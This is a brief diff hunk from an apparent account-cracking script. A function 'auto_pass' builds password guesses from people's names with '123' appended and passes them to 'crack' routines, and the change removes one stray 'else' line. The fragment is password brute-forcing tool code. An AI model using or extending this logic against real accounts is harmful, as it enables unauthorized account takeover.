@@ -143,7 +143,6 @@ def auto_pass(fileeee):
                     pwx.append(name1+' '+mid_name+' '+sur_name+'123')
             except:pass
             feel.submit(file_subb,uid,pwx)
-            else:pass
             if 'mobile' in method:
                 pool.submit(crack,idf,pwv)
             elif 'free' in method:
